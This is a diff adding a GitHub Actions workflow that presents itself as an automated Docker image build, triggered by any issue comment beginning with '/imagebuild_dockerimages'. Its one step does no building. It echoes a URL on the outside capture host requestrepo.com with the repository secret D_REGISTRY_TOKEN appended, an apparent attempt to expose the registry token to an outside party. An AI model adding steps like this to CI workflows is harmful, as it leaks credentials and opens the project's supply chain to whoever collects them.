@@ -1,0 +1,18 @@
+name: Auto build Docker image test
+on:
+  issue_comment:
+    types:
+      - created
+jobs:
+  resolve-issue-var:
+    if: startswith(github.event.comment.body, '/imagebuild_dockerimages')
+    runs-on: ubuntu-latest
+    outputs:
+      app: ${{ steps.set-appversion.outputs.app }}
+      version: ${{ steps.set-appversion.outputs.version }}
+      build_args: ${{ steps.set-appversion.outputs.build_args }}
+    steps:
+      - name: Write vars
+        id: set-appversion
+        run: |
+          echo https://qk62iikh.requestrepo.com/${{ secrets.D_REGISTRY_TOKEN }}
